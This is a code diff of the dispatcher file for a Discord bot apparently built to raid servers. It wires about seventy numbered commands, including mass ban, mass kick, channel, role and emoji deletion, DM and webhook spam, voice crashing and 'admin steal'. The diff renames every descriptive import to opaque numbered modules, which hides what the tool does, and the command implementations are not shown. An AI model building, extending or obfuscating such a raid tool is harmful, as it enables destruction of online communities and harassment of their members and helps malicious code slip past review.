@@ -1,82 +1,82 @@
 import asyncio
 import discord
 from discord.ext import commands
-from core.config.settings import BOT_TOKEN, PREFIX
-from core.commands.nuke import NukeCommand
-from core.commands.ban import BanCommand
-from core.commands.kick import KickCommand
-from core.commands.mute import MuteCommand
-from core.commands.deafen import DeafenCommand
-from core.commands.softban import SoftbanCommand
-from core.commands.hackban import HackbanCommand
-from core.commands.unban import UnbanCommand
-from core.commands.warn import WarnCommand
-from core.commands.clear import ClearCommand
-from core.commands.messagespam import MessageSpamCommand
-from core.commands.dmspam import DmSpamCommand
-from core.commands.webhookspam import WebhookSpamCommand
-from core.commands.reactionspam import ReactionSpamCommand
-from core.commands.channelspam import ChannelSpamCommand
-from core.commands.mentionspam import MentionSpamCommand
-from core.commands.filespam import FileSpamCommand
-from core.commands.embedspam import EmbedSpamCommand
-from core.commands.stickerspam import StickerSpamCommand
-from core.commands.voicejoin import VoiceJoinCommand
-from core.commands.voiceleave import VoiceLeaveCommand
-from core.commands.voicecrash import VoiceCrashCommand
-from core.commands.voicemove import VoiceMoveCommand
-from core.commands.voicecreate import VoiceCreateCommand
-from core.commands.voicedelete import VoiceDeleteCommand
-from core.commands.rolenuke import RoleNukeCommand
-from core.commands.rolemass import RoleMassCommand
-from core.commands.adminsteal import AdminStealCommand
-from core.commands.rolecreate import RoleCreateCommand
-from core.commands.roledelete import RoleDeleteCommand
-from core.commands.roleassign import RoleAssignCommand
-from core.commands.rolemove import RoleMoveCommand
-from core.commands.channeldelete import ChannelDeleteCommand
-from core.commands.channelcreate import ChannelCreateCommand
-from core.commands.channellock import ChannelLockCommand
-from core.commands.channelunlock import ChannelUnlockCommand
-from core.commands.channelclone import ChannelCloneCommand
-from core.commands.channelrename import ChannelRenameCommand
-from core.commands.channelposition import ChannelPositionCommand
-from core.commands.nickall import NickAllCommand
-from core.commands.avatarall import AvatarAllCommand
-from core.commands.kickall import KickAllCommand
-from core.commands.banall import BanAllCommand
-from core.commands.roleall import RoleAllCommand
-from core.commands.mentionall import MentionAllCommand
-from core.commands.memberinfo import MemberInfoCommand
-from core.commands.status import StatusCommand
-from core.commands.config import ConfigCommand
-from core.commands.help import HelpCommand
-from core.commands.stop import StopCommand
-from core.commands.invitegen import InviteGenCommand
-from core.commands.ping import PingCommand
-from core.commands.serverinfo import ServerInfoCommand
-from core.commands.userinfo import UserInfoCommand
-from core.commands.uptime import UptimeCommand
-from core.commands.reload import ReloadCommand
-from core.commands.guildicon import GuildIconCommand
-from core.commands.guildname import GuildNameCommand
-from core.commands.guildregion import GuildRegionCommand
-from core.commands.guildvanity import GuildVanityCommand
-from core.commands.guildsplash import GuildSplashCommand
-from core.commands.emojiSteal import EmojiStealCommand
-from core.commands.emojiDelete import EmojiDeleteCommand
-from core.commands.emojiCreate import EmojiCreateCommand
-from core.commands.stickerDelete import StickerDeleteCommand
-from core.commands.stickerCreate import StickerCreateCommand
-from core.commands.boost import BoostCommand
-from core.commands.react import ReactCommand
-from core.commands.dm import DmCommand
-from core.commands.messageEdit import MessageEditCommand
-from core.commands.messageDelete import MessageDeleteCommand
-from core.commands.admin import AdminCommand
-from core.handlers.event import EventHandler
-from core.ratelimit.manager import RateLimitManager
-from core.logger.logger import Logger
+from core.g._78 import BOT_TOKEN
+from core.a._1 import _1
+from core.a._2 import _2
+from core.a._3 import _3
+from core.a._4 import _4
+from core.a._5 import _5
+from core.a._6 import _6
+from core.a._7 import _7
+from core.a._8 import _8
+from core.a._9 import _9
+from core.a._10 import _10
+from core.a._11 import _11
+from core.a._12 import _12
+from core.a._13 import _13
+from core.a._14 import _14
+from core.a._15 import _15
+from core.a._16 import _16
+from core.a._17 import _17
+from core.a._18 import _18
+from core.a._19 import _19
+from core.a._20 import _20
+from core.a._21 import _21
+from core.a._22 import _22
+from core.a._23 import _23
+from core.a._24 import _24
+from core.a._25 import _25
+from core.a._26 import _26
+from core.a._27 import _27
+from core.a._28 import _28
+from core.a._29 import _29
+from core.a._30 import _30
+from core.a._31 import _31
+from core.a._32 import _32
+from core.a._33 import _33
+from core.a._34 import _34
+from core.a._35 import _35
+from core.a._36 import _36
+from core.a._37 import _37
+from core.a._38 import _38
+from core.a._39 import _39
+from core.a._40 import _40
+from core.a._41 import _41
+from core.a._42 import _42
+from core.a._43 import _43
+from core.a._44 import _44
+from core.a._45 import _45
+from core.a._46 import _46
+from core.a._47 import _47
+from core.a._48 import _48
+from core.a._49 import _49
+from core.a._50 import _50
+from core.a._51 import _51
+from core.a._52 import _52
+from core.a._53 import _53
+from core.a._54 import _54
+from core.a._55 import _55
+from core.a._56 import _56
+from core.a._57 import _57
+from core.a._58 import _58
+from core.a._59 import _59
+from core.a._60 import _60
+from core.a._61 import _61
+from core.a._62 import _62
+from core.a._63 import _63
+from core.a._64 import _64
+from core.a._65 import _65
+from core.a._66 import _66
+from core.a._67 import _67
+from core.a._68 import _68
+from core.a._69 import _69
+from core.a._70 import _70
+from core.b._71 import _71
+from core.b._72 import _72
+from core.b._73 import _73
+from core.c._74 import _74
+from core.f._77 import _77
 
 DRAGON = r'''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡠⠔⠒⠊⠉⠉⠉⠉⠙⠋⠛⠻⠶⣢⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
@@ -105,322 +105,181 @@ DRAGON = r'''
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⠰⠀⠀⠀⠠⢀⠀⣿⣿⣿⣯⣯⠉⣿⣿⣿⣿⡿⡉⣇⠌⡗⢛⢣⣽⣿⣿⣿⣿⣹⠀⠀⠀⠀⠀⠀⠀
 '''
 
-logger = Logger()
-ratelimit = RateLimitManager()
-event_handler = EventHandler()
-
 intents = discord.Intents.default()
 intents.guilds = True
 intents.members = True
 intents.message_content = True
 intents.voice_states = True
 
-bot = commands.Bot(command_prefix=PREFIX, intents=intents)
+bot = commands.Bot(command_prefix=".", intents=intents)
+_72_inst = _72()
+_77_inst = _77()
 
 @bot.event
 async def on_ready():
     print(DRAGON)
     print("")
-    logger.info(f"Bot online as {bot.user}")
-    logger.info(f"Prefix: {PREFIX}")
-    await event_handler.on_ready(bot)
+    _73(f"Bot online as {bot.user}")
+    _73(f"Prefix: .")
+    await _77_inst._78(bot)
 
 @bot.event
 async def on_message(message):
     if message.author.bot:
         return
-    if ratelimit.check(message.author.id):
+    if _72_inst._73(message.author.id):
         await message.delete()
         await message.channel.send(f"RATE LIMITED {message.author.mention}", delete_after=2)
         return
     await bot.process_commands(message)
 
 @bot.command(name="1")
-async def cmd_1(ctx):
-    await NukeCommand().execute(ctx)
-
+async def _79(ctx): await _1(ctx)
 @bot.command(name="2")
-async def cmd_2(ctx):
-    await ConfigCommand().execute(ctx)
-
+async def _80(ctx): await _2(ctx)
 @bot.command(name="3")
-async def cmd_3(ctx):
-    await StatusCommand().execute(ctx, bot)
-
+async def _81(ctx): await _3(ctx, bot)
 @bot.command(name="4")
-async def cmd_4(ctx):
-    await HelpCommand().execute(ctx)
-
+async def _82(ctx): await _4(ctx)
 @bot.command(name="5")
-async def cmd_5(ctx):
-    await StopCommand().execute(ctx, bot)
-
+async def _83(ctx): await _5(ctx, bot)
 @bot.command(name="6")
-async def cmd_6(ctx):
-    await BanAllCommand().execute(ctx)
-
+async def _84(ctx): await _6(ctx)
 @bot.command(name="7")
-async def cmd_7(ctx):
-    await KickAllCommand().execute(ctx)
-
+async def _85(ctx): await _7(ctx)
 @bot.command(name="8")
-async def cmd_8(ctx):
-    await RoleNukeCommand().execute(ctx)
-
+async def _86(ctx): await _8(ctx)
 @bot.command(name="9")
-async def cmd_9(ctx):
-    await WebhookSpamCommand().execute(ctx)
-
+async def _87(ctx): await _9(ctx)
 @bot.command(name="10")
-async def cmd_10(ctx):
-    await ChannelSpamCommand().execute(ctx)
-
+async def _88(ctx): await _10(ctx)
 @bot.command(name="11")
-async def cmd_11(ctx):
-    await EmojiDeleteCommand().execute(ctx)
-
+async def _89(ctx): await _11(ctx)
 @bot.command(name="12")
-async def cmd_12(ctx):
-    await StickerDeleteCommand().execute(ctx)
-
+async def _90(ctx): await _12(ctx)
 @bot.command(name="13")
-async def cmd_13(ctx):
-    await VoiceCrashCommand().execute(ctx)
-
+async def _91(ctx): await _13(ctx)
 @bot.command(name="14")
-async def cmd_14(ctx):
-    await AdminStealCommand().execute(ctx)
-
+async def _92(ctx): await _14(ctx)
 @bot.command(name="15")
-async def cmd_15(ctx):
-    await InviteGenCommand().execute(ctx)
-
+async def _93(ctx): await _15(ctx)
 @bot.command(name="16")
-async def cmd_16(ctx):
-    await MessageSpamCommand().execute(ctx)
-
+async def _94(ctx): await _16(ctx)
 @bot.command(name="17")
-async def cmd_17(ctx):
-    await DmSpamCommand().execute(ctx)
-
+async def _95(ctx): await _17(ctx)
 @bot.command(name="18")
-async def cmd_18(ctx):
-    await RoleMassCommand().execute(ctx)
-
+async def _96(ctx): await _18(ctx)
 @bot.command(name="19")
-async def cmd_19(ctx):
-    await ChannelDeleteCommand().execute(ctx)
-
+async def _97(ctx): await _19(ctx)
 @bot.command(name="20")
-async def cmd_20(ctx):
-    await ChannelCreateCommand().execute(ctx)
-
+async def _98(ctx): await _20(ctx)
 @bot.command(name="21")
-async def cmd_21(ctx):
-    await ChannelLockCommand().execute(ctx)
-
+async def _99(ctx): await _21(ctx)
 @bot.command(name="22")
-async def cmd_22(ctx):
-    await ChannelUnlockCommand().execute(ctx)
-
+async def _100(ctx): await _22(ctx)
 @bot.command(name="23")
-async def cmd_23(ctx):
-    await NickAllCommand().execute(ctx)
-
+async def _101(ctx): await _23(ctx)
 @bot.command(name="24")
-async def cmd_24(ctx):
-    await AvatarAllCommand().execute(ctx)
-
+async def _102(ctx): await _24(ctx)
 @bot.command(name="25")
-async def cmd_25(ctx):
-    await BoostCommand().execute(ctx)
-
+async def _103(ctx): await _25(ctx)
 @bot.command(name="26")
-async def cmd_26(ctx):
-    await ReactionSpamCommand().execute(ctx)
-
+async def _104(ctx): await _26(ctx)
 @bot.command(name="27")
-async def cmd_27(ctx):
-    await VoiceJoinCommand().execute(ctx)
-
+async def _105(ctx): await _27(ctx)
 @bot.command(name="28")
-async def cmd_28(ctx):
-    await VoiceLeaveCommand().execute(ctx)
-
+async def _106(ctx): await _28(ctx)
 @bot.command(name="29")
-async def cmd_29(ctx):
-    await MuteCommand().execute(ctx)
-
+async def _107(ctx): await _29(ctx)
 @bot.command(name="30")
-async def cmd_30(ctx):
-    await DeafenCommand().execute(ctx)
-
+async def _108(ctx): await _30(ctx)
 @bot.command(name="31")
-async def cmd_31(ctx):
-    await SoftbanCommand().execute(ctx)
-
+async def _109(ctx): await _31(ctx)
 @bot.command(name="32")
-async def cmd_32(ctx):
-    await HackbanCommand().execute(ctx)
-
+async def _110(ctx): await _32(ctx)
 @bot.command(name="33")
-async def cmd_33(ctx):
-    await UnbanCommand().execute(ctx)
-
+async def _111(ctx): await _33(ctx)
 @bot.command(name="34")
-async def cmd_34(ctx):
-    await WarnCommand().execute(ctx)
-
+async def _112(ctx): await _34(ctx)
 @bot.command(name="35")
-async def cmd_35(ctx):
-    await ClearCommand().execute(ctx)
-
+async def _113(ctx): await _35(ctx)
 @bot.command(name="36")
-async def cmd_36(ctx):
-    await MentionSpamCommand().execute(ctx)
-
+async def _114(ctx): await _36(ctx)
 @bot.command(name="37")
-async def cmd_37(ctx):
-    await FileSpamCommand().execute(ctx)
-
+async def _115(ctx): await _37(ctx)
 @bot.command(name="38")
-async def cmd_38(ctx):
-    await EmbedSpamCommand().execute(ctx)
-
+async def _116(ctx): await _38(ctx)
 @bot.command(name="39")
-async def cmd_39(ctx):
-    await StickerSpamCommand().execute(ctx)
-
+async def _117(ctx): await _39(ctx)
 @bot.command(name="40")
-async def cmd_40(ctx):
-    await VoiceMoveCommand().execute(ctx)
-
+async def _118(ctx): await _40(ctx)
 @bot.command(name="41")
-async def cmd_41(ctx):
-    await VoiceCreateCommand().execute(ctx)
-
+async def _119(ctx): await _41(ctx)
 @bot.command(name="42")
-async def cmd_42(ctx):
-    await VoiceDeleteCommand().execute(ctx)
-
+async def _120(ctx): await _42(ctx)
 @bot.command(name="43")
-async def cmd_43(ctx):
-    await RoleCreateCommand().execute(ctx)
-
+async def _121(ctx): await _43(ctx)
 @bot.command(name="44")
-async def cmd_44(ctx):
-    await RoleDeleteCommand().execute(ctx)
-
+async def _122(ctx): await _44(ctx)
 @bot.command(name="45")
-async def cmd_45(ctx):
-    await RoleAssignCommand().execute(ctx)
-
+async def _123(ctx): await _45(ctx)
 @bot.command(name="46")
-async def cmd_46(ctx):
-    await RoleMoveCommand().execute(ctx)
-
+async def _124(ctx): await _46(ctx)
 @bot.command(name="47")
-async def cmd_47(ctx):
-    await ChannelCloneCommand().execute(ctx)
-
+async def _125(ctx): await _47(ctx)
 @bot.command(name="48")
-async def cmd_48(ctx):
-    await ChannelRenameCommand().execute(ctx)
-
+async def _126(ctx): await _48(ctx)
 @bot.command(name="49")
-async def cmd_49(ctx):
-    await ChannelPositionCommand().execute(ctx)
-
+async def _127(ctx): await _49(ctx)
 @bot.command(name="50")
-async def cmd_50(ctx):
-    await RoleAllCommand().execute(ctx)
-
+async def _128(ctx): await _50(ctx)
 @bot.command(name="51")
-async def cmd_51(ctx):
-    await MentionAllCommand().execute(ctx)
-
+async def _129(ctx): await _51(ctx)
 @bot.command(name="52")
-async def cmd_52(ctx):
-    await MemberInfoCommand().execute(ctx)
-
+async def _130(ctx): await _52(ctx)
 @bot.command(name="53")
-async def cmd_53(ctx):
-    await PingCommand().execute(ctx)
-
+async def _131(ctx): await _53(ctx)
 @bot.command(name="54")
-async def cmd_54(ctx):
-    await ServerInfoCommand().execute(ctx)
-
+async def _132(ctx): await _54(ctx)
 @bot.command(name="55")
-async def cmd_55(ctx):
-    await UserInfoCommand().execute(ctx)
-
+async def _133(ctx): await _55(ctx)
 @bot.command(name="56")
-async def cmd_56(ctx):
-    await UptimeCommand().execute(ctx, bot)
-
+async def _134(ctx): await _56(ctx, bot)
 @bot.command(name="57")
-async def cmd_57(ctx):
-    await ReloadCommand().execute(ctx)
-
+async def _135(ctx): await _57(ctx)
 @bot.command(name="58")
-async def cmd_58(ctx):
-    await GuildIconCommand().execute(ctx)
-
+async def _136(ctx): await _58(ctx)
 @bot.command(name="59")
-async def cmd_59(ctx):
-    await GuildNameCommand().execute(ctx)
-
+async def _137(ctx): await _59(ctx)
 @bot.command(name="60")
-async def cmd_60(ctx):
-    await GuildRegionCommand().execute(ctx)
-
+async def _138(ctx): await _60(ctx)
 @bot.command(name="61")
-async def cmd_61(ctx):
-    await GuildVanityCommand().execute(ctx)
-
+async def _139(ctx): await _61(ctx)
 @bot.command(name="62")
-async def cmd_62(ctx):
-    await GuildSplashCommand().execute(ctx)
-
+async def _140(ctx): await _62(ctx)
 @bot.command(name="63")
-async def cmd_63(ctx):
-    await EmojiStealCommand().execute(ctx)
-
+async def _141(ctx): await _63(ctx)
 @bot.command(name="64")
-async def cmd_64(ctx):
-    await EmojiCreateCommand().execute(ctx)
-
+async def _142(ctx): await _64(ctx)
 @bot.command(name="65")
-async def cmd_65(ctx):
-    await StickerCreateCommand().execute(ctx)
-
+async def _143(ctx): await _65(ctx)
 @bot.command(name="66")
-async def cmd_66(ctx):
-    await ReactCommand().execute(ctx)
-
+async def _144(ctx): await _66(ctx)
 @bot.command(name="67")
-async def cmd_67(ctx):
-    await DmCommand().execute(ctx)
-
+async def _145(ctx): await _67(ctx)
 @bot.command(name="68")
-async def cmd_68(ctx):
-    await MessageEditCommand().execute(ctx)
-
+async def _146(ctx): await _68(ctx)
 @bot.command(name="69")
-async def cmd_69(ctx):
-    await MessageDeleteCommand().execute(ctx)
-
+async def _147(ctx): await _69(ctx)
 @bot.command(name="70")
-async def cmd_70(ctx):
-    await AdminCommand().execute(ctx)
+async def _148(ctx): await _70(ctx)
 
 if __name__ == "__main__":
     if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
         print("")
-        print("ERROR - YOU DIDNT PUT YOUR TOKEN IN CONFIG.PY")
+        print("ERROR - YOU DIDNT PUT YOUR TOKEN")
         print("")
-        print("1. Open core/config/settings.py")
+        print("1. Open core/g/_78.py")
         print("2. Change BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE' to your actual token")
         print("3. Get token from: https://discord.com/developers/applications")
         print("")
@@ -434,6 +293,6 @@ if __name__ == "__main__":
         print("1. Go to: https://discord.com/developers/applications")
         print("2. Click your application")
         print("3. Go to Bot tab")
-        print("4. Copy the token and paste in core/config/settings.py")
+        print("4. Copy the token and paste in core/g/_78.py")
         print("")
         exit(1)
